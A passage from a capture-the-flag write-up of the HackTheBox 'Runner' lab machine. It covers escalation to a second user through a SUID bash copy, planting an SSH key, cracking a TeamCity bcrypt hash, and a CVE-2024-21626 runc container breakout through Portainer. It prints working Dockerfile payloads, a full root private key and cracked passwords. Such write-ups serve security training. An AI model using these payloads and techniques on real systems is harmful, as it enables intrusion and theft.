  IPv6 address for eth0:            dead:beef::250:56ff:feb0:1b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status
```

## user.txt

We grabbed the `user.txt` and moved on.

```c
john@runner:~$ cat user.txt 
12a2245b659277ffb17f9897f2521e4d
```

## Privilege Escalation to matthew

Since the `/data` directory was mounted inside the `Docker container` we copied a `bash binary` to the `datadir` folder as form inside the `container`, set `rwx (777)` as `permissions` and added `u+s` to make it a `SUID` binary.

```c
pwd
/data/teamcity_server/datadir
```

```c
cp /bin/bash .
chmod 777 ./bash
chmod u+s ./bash
```

Then with `john` we used the binary which we created before with tag `-p` to maintain the `permiossions` of the initial user and so we escalated our privileges to `matthew`.

```c
john@runner:/data/teamcity_server/datadir$ ls -la
total 1180
drwxr-xr-x 6 matthew matthew    4096 Apr 20 19:49 .
drwxr-xr-x 4 root    root       4096 Feb 28 10:31 ..
-rwsrwxrwx 1 matthew matthew 1183448 Apr 20 19:49 bash
drwxr-x--- 8 matthew matthew    4096 Apr 20 19:35 config
drwxr-x--- 3 matthew matthew    4096 Feb 28 10:36 lib
drwxr-x--- 3 matthew matthew    4096 Apr 20 19:36 plugins
drwxr-x--- 6 matthew matthew    4096 Apr 20 03:00 system
```

```c
john@runner:/data/teamcity_server/datadir$ ./bash -p
bash-5.0$ id
uid=1001(john) gid=1001(john) euid=1000(matthew) groups=1001(john)
bash-5.0$
```

## Persistence

It was not necessary to get root but we added our own `SSH Key` to a `.ssh` directory we created and set the correct permissions to work with.

```c
bash-5.0$ mkdir .ssh
bash-5.0$ cd .ssh
bash-5.0$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAiZ0BuXmspO/KEZqHsGB6jfgR9MxK9uRqSInr+uEitc/Qgg6UjMx7acdim1oMazprDLSHnYGf/SCA8C2/G6sEwTmMzRVlLc0BY4nOa01oi7j1AUDZPu1O8tbPLZSTaxaTPeKLlVjmp6isdiwvFcIvcvfo9TvKUK4S5QXnIPAdEv/B+glmiOsZS8QZiPpkSlhvoW1zXkfSemwDrhyiFt44UgV92ji3du52yck1AJ6/XIBs/jODUod/wZdjsxLTSv4AhyplLQno68rNU7+fXduO6jnaJQ9ijz8B9KHSdzvn67NWiqZoJoUKJvUnuHtjP5IiXlvfu+VkhtKnR1tEiJUD5iCvfodvAvWmO4QTUgVX8YNY4wWJCs4Pwxg8N64bdsGxdkK4FwcBSMt/K1nkGxUXDEtX1pZpd1UFJJmxycVJCRu9cdr/tBl89/Bx3iYlfaPdr8cgZO5kC8I/r9KPI/hkPQk19JLg4+A/w4hysGGyHM4NZRUVmRHzlJMfdkXKjywHHMAEhthmPmAU84LLbl74BlRoj4cY245QviCIx9JbPtREbn/y1QIbPkExzqaOZbt9W4X8vuFybj5qqHb0P8DXGon91ISIhyuGB52B3XW6IoogYtYdS4HvCJmPjitfPwHWkNTqdZzOfMIAfYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==' > authorized_keys
bash-5.0$ chmod 600 authorized_keys
bash-5.0$ cd ..
bash-5.0$ chmod 700 .ssh
bash-5.0$
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Runner/files]
└─$ ssh matthew@runner.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Apr 20 08:39:13 PM UTC 2024

  System load:                      0.12255859375
  Usage of /:                       84.5% of 9.74GB
  Memory usage:                     41%
  Swap usage:                       8%
  Processes:                        238
  Users logged in:                  1
  IPv4 address for br-21746deff6ac: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.48.208
  IPv6 address for eth0:            dead:beef::250:56ff:feb0:1b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matthew@runner:~$
```

## Pivoting

We noticed that a lot `ports` were only running on `local listeners` so we checked them out.

```c
matthew@runner:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

## LinPEAS

The use of `LinPEAS` speeded up the `process of enumeration`. In the output we found another `subdomain` called `portainer-administration.runner.htb`.

```c
<--- CUT FOR BREVITY --->
server {
    listen 80;
    server_name portainer-administration.runner.htb;
    location / {
        proxy_pass https://localhost:9443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
<--- CUT FOR BREVITY --->
```

And this one also went down directly to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.48.208   runner.htb
10.129.48.208   teamcity.runner.htb
10.129.48.208   portainer-administration.runner.htb
```

## Getting Password Hash

We knew that we probably `missed` some `credentials` and so we double checked the `file system` before we moved on with the `subdomain` and indeed a `grep` for the username of `matthew` revealed a new hash, placed inside a binary.

```c
matthew@runner:/data$ grep -rai 'matthew'
grep: tls: Permission denied
grep: compose: Permission denied
grep: portainer.db: Permission denied
grep: bin: Permission denied
grep: docker_config: Permission denied
grep: certs: Permission denied
teamcity_server/datadir/config/_trash/AllProjects.project1/project-config.xml:  <description>Matthew's projects</description>
teamcity_server/datadir/config/projects/AllProjects/project-config.xml.1:  <description>Matthew's projects</description>
teamcity_server/datadir/system/pluginData/audit/configHistory/projects/project1/config.xml.1:  <description>Matthew's projects</description>
teamcity_server/datadir/system/buildserver.data:`����_Root$90ae9702-9eb4-4ef4-a14f-5012640b5024`

                                                                                               project1$74bcc617-7a28-47cb-9b99-809e598e90f7`����$00000000-0000-4000-8000-000000000000@▒_Root_Root�`▒project1
                                                                                                                                                                                                             AllProjects�project1       MProjects`����_deleted_vcs_root�@Default�ALL_USERS_GROUP    All Usersontains all TeamCity users�,,admin<$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufyeJohnjohn@runner.htb��H��BCRYPT�&&matthew<$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.EmMatthewmatthew@runner.htb��M��BCRYPT`5P5addTriggeredBuildToFavoritestrue6u�`28;28;asSeenExperimentalOverviewtrue6u�`5SV5lastSeenSakuraUIVersion        2023.05.33��5CJ5FlastSelectedCreateObjectOptioncreateManuallwas.logged.intrue6u�`cjgcALL_USERS_GROUPemail D�`gjj`gjALL_USERS_GROUPIDE_NotificatorL`cr`cALL_USERS_GROUPemail�cncn`cnALL_USERS_GROUPIDE_Notificator�rjjrjALL_USERS_GROUP29390Vx�R`YM
                                                                                                                                                                          WindowsTray�ngnALL_USERS_GROUPjabber�z�~zALL_USERS_GROUPemail_Root�v~��v~�ALL_USERS_GROUPIDE_Notificator_Root�z�vzALL_USERS_GROUPemail__SYSTEM_WIDE__�z�z�vz�ALL_USERS_GROUPIDE_Notificator__SYSTEM_WIDE__������ALL_USERS_GROUP
                                                                                                                                                             WindowsTray__SYSTEM_WIDE__��~�ALL_USERS_GROUPjabber__SYSTEM_WIDE__`��ALL_USERS_GROUPuserChangesOnly='true'`��ALL_USERS_GROUPuserChangesOnly='true'project1@�_Root@project1`���anyVcs����admin`���anyVcs����matthew@`����������▒PROJECT_VIEWER`������
                                                                                                                                                                     SYSTEM_ADMIN`���PROJECT_DEVELOPEproject1`ALL_USERS_GROUPPROJECT_DEVELOPER@�����d�@����CS���@���        �Ջ��@����jRX��:@���+B�`@����qgϟ@���8����@�����.���@���ás)��@���)ձYl@�O��t�ˢJ@���\talU��@�qc�p��O�@���wnH▒:ʔ�@�}'�
                                                                                                                                                 ��Lj`����N��`��������Rt�`����SS�`��������S~�`��e��I��`������f��J;$���g��J;7project settings were updated`����h��L7�`��i��Lج`������j��Lؼ`��k��L�`������l��L�`��m��M,�������������������/ENew username: 'admin', new name: 'John', new email: 'john@runner.htb'`����������������mUser password was updated`�������������ۀ`▒▒����▒.▒▒1`▒▒▒
grep: portainer.key: Permission denied
grep: portainer.pub: Permission denied
grep: chisel: Permission denied
```

## Cracking the Hash

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Runner/files]
└─$ cat hash
$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Runner/files]
└─$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 128 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
piper123         (?)     
1g 0:00:00:58 DONE (2024-04-20 17:12) 0.01697g/s 883.8p/s 883.8c/s 883.8C/s playboy93..onelife
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Username | Password |
| -------- | -------- |
| matthew  | piper123 |

## Privilege Escalation to root 

### CVE-2024-21626: runc Working Directory Breakout

We moved on with the `subdomain` and were able to login as `matthew` on the `portainer.io` application.

- [https://labs.withsecure.com/publications/runc-working-directory-breakout--cve-2024-21626](https://labs.withsecure.com/publications/runc-working-directory-breakout--cve-2024-21626)

![](images/2024-04-20_17-09_portainer_login.png)

From the `dashboard` we clicked on `Live connect` and navigated to `Images`.

![](images/2024-04-20_17-09_portainer_dashboard.png)

![](images/2024-04-20_17-09_portainer_primary_dashboard.png)

On the `Images` tab we clicked on `Build a new image`.

![](images/2024-04-20_17-09_portainer_primary_images.png)

We provided a `random name` to the `new image` and added our payload.

![](images/2024-04-20_17-09_portainer_primary_build_new_image.png)

```c
FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls /root && cat root/root.txt
    
```

Since `portainer.io` was using the `Docker Socket` it was possible to files in the `/root` directory.

![](images/2024-04-20_17-09_portainer_primary_build_new_image_payload.png)

In the `logfile output` we found the content of the `root.txt`.

![](images/2024-04-20_17-16_root.txt.png)

## root.txt

```c
Step 1/3 : FROM ubuntu

 ---> ca2b0f26964c

Step 2/3 : WORKDIR /proc/self/fd/8

 ---> Running in d54da306399d

 ---> Removed intermediate container d54da306399d

 ---> 8fba66db9cb3

Step 3/3 : RUN cd ../../../../ &&     ls /root && cat root/root.txt

 ---> Running in 61c4b2f855a9

sh: 0: getcwd() failed: No such file or directory

/bin/sh: 1: cd: getcwd() failed: No such file or directory

c3c9e3b33626f14a774061245d7ce449

 ---> Removed intermediate container 61c4b2f855a9

 ---> 42f6a7ea82dc

Successfully built 42f6a7ea82dc

Successfully tagged root.txt:latest
```

## Post Exploitation

As last step we went for `exfiltration` of the `SSH Key` of `root` but since the key was `not` in the `authorized_keys` file, we had to find another way to get a shell.

```c
FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls /root && cat root/.ssh/id_rsa
    
```

```c
Step 1/3 : FROM ubuntu

 ---> ca2b0f26964c

Step 2/3 : WORKDIR /proc/self/fd/8

 ---> Using cache

 ---> 597326d5196f

Step 3/3 : RUN cd ../../../../ &&     ls /root && cat root/.ssh/id_rsa

 ---> Running in aa657f50a2fc

sh: 0: getcwd() failed: No such file or directory
/bin/sh: 1: cd: getcwd() failed: No such file or directory

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEApxRKdFjSiNCJZC0bx2QPGESZOkMyPXlWtOvWNdx6KFGU3Qd6LXUO
KdGG3PeGwgTwjGOLtroBLI1k40nNLDcVk9yhAYxGfXPfolVS6C99+vCtEKR46bnuugVtqO
DoK76TpTOkAAjdXnz0/t9DTNl3UJE8nQfkk/icM3duvo/qkqhYgwlCMbC6l3ZiUvLrdUsY
vRkOUWfaPyOLVGdZL3izVg6U3Mu5ZNppgm5OqAHdEN15qDsVYs7GkpNY5tfvm5DvU1iX2Z
t9MFTDm46AMPytyGCPpwm2fO3IRAWaOuLpWoxQvtz91RkOBjJXYkIOMdZXNmn97iH30CIY
N21h8swE8BvIajy4wahxH8Nct+zLn4qikbpcnskzqg8RiNGPXEpC/h+9lva8pRIIiSKVuJ
3P1l6MR0e+sJpfXHeW541tXAfKu3KDgbuxtCrSV2ICG+fY32RPhlotp4oMWg4KOYv26g4S
HFf47TQhSJbw88PLIZeSx6o1BfzJrbt28e9UP/opAAAFgNF/QRLRf0ESAAAAB3NzaC1yc2
EAAAGBAKcUSnRY0ojQiWQtG8dkDxhEmTpDMj15VrTr1jXceihRlN0Hei11DinRhtz3hsIE
8Ixji7a6ASyNZONJzSw3FZPcoQGMRn1z36JVUugvffrwrRCkeOm57roFbajg6Cu+k6UzpA
AI3V589P7fQ0zZd1CRPJ0H5JP4nDN3br6P6pKoWIMJQjGwupd2YlLy63VLGL0ZDlFn2j8j
i1RnWS94s1YOlNzLuWTaaYJuTqgB3RDdeag7FWLOxpKTWObX75uQ71NYl9mbfTBUw5uOgD
D8rchgj6cJtnztyEQFmjri6VqMUL7c/dUZDgYyV2JCDjHWVzZp/e4h99AiGDdtYfLMBPAb
yGo8uMGocR/DXLfsy5+KopG6XJ7JM6oPEYjRj1xKQv4fvZb2vKUSCIkilbidz9ZejEdHvr
CaX1x3lueNbVwHyrtyg4G7sbQq0ldiAhvn2N9kT4ZaLaeKDFoOCjmL9uoOEhxX+O00IUiW
8PPDyyGXkseqNQX8ya27dvHvVD/6KQAAAAMBAAEAAAGAEpHaxJuqqrIi0xOAZuTkGJpnPW
aCivqVfH5JzKq4mQqYNQjDt5GvBU7YYm7Qd3f9FF1sBd8eikkc0XY+a4+jwk9fRcDFhOQA
ExbQpCXDJsThN1xQZAnaUqqPyZlVtKb12gKnU6mokPvqbvl5jW0OKdI6nmlmKlwTYFUB5g
Qw2iQD0myRAtzVoEf0HawKJ3s1QK8sPDgCtcnJjpP+AZy0sffk67Vo4aC04V5JN7sdSuaS
wvPuKJE62MevtdiCNRQilzpEDoCl5EtJZoYFLbWDt9bMiVynUIkXWMLwtw1PKfoV7Y8NRl
H795+FaxJi+rid/Z7qunhgIoLSXGOVWW/ID91k1HlpzG/I8QweoXDjs1oXg7VgSs3UqigV
o6HAvFBHpWtmm8F98BB5dAM+jFEnj2knH4DVcCE/IsCgPDEX503cqTcOkxftBHIVpXkR1N
/+ni6Hd7chznqZ5N2Q0JeC+hx0FujMSnUuFzF5+Y7+EvqCU1WNBCK6qV4LNzD5SwIBAAAA
wDD1/mFaupOH+WuvM3EINACQexNcuTKTpLZYjlxFMTdSdTMF8QjFjNfQaAl5Ht/pt2XfY1
LrOcfmLYI6Io0jfhoX3iMgqj9ytg+o8CK/XQNUeFGUv55E4WR1MDYcRnb+dIujMmBD2BKu
ZEw11b6XwhGzWfWzdzWmK78hS0sjCuhAFxaf9ycmtxxVTgzEQ3u5WPZnloSbDk+RNcpPNn
buidgYWnfO+B0lQh4mo9xXiFmOKWdPL3s3MzbNMmH/LY0pQgAAAMEAu1j/DGBxbIHYa1SM
VptHXOfX5kiyWemSfv0GJyfKs78rYJRmxW3LVVjP68yjRGFtifFluxZ2fElWpNigaCe8a/
kTi0SyCkeZr+5tGWzvx9eyIXS10cPO9W9FcMNvxdAkAiZWlaGMkC5AFzIjU1rWiEuLEsd9
5Yb9/aOsrIpf6VOXnKo/JuZ6Xn6ytjOAVp4J1oNJ4iS0C1pyv88dok3ALnO66nFddxn5EA
jJQvM4/9CJmnpIa0r4Erbywoy5GkT5AAAAwQDkTe0fukJHFg6xKRfaATEXdKCxG4b6F8FN
dVZKoJzHX1rNTxkNKiAxFB2DZimoleywGCSXl7btriEOOZkEoJNReY/VDJynA95LzjMLL6
/U9wVSb/d9GIf9+1LIFdetfy7zbqWYCILUaxw3AsXqrznz76EqGXRaYAX9+aBla8hohRsc
9vKZ3cmq5YxQrFoy4M/NO1u9SB50zwHK5/xCmeNzgRlcd0tbDwgns15FPEUGD/O+RbO/9T
MqhvS/eaT9GrEAAAALcm9vdEBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----

 ---> Removed intermediate container aa657f50a2fc

 ---> fec740c5074b

Successfully built fec740c5074b

Successfully tagged id_rsa:latest
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Runner/files]
└─$ cat root_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
MqhvS/eaT9GrEAAAALcm9vdEBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
```

For the following solution we had to be quick because the cleanup script reset the changes.

```c
FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls /root && cat root/root.txt && \
    chmod u+s ../../../../../../../bin/bash
```

Here is our more permanent solution.

```c
FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls /root && cat root/root.txt && \
    cp ../../../../../../../bin/bash ../../../../../../../bin/bash2 && \
    chmod u+s ../../../../../../../bin/bash2
```
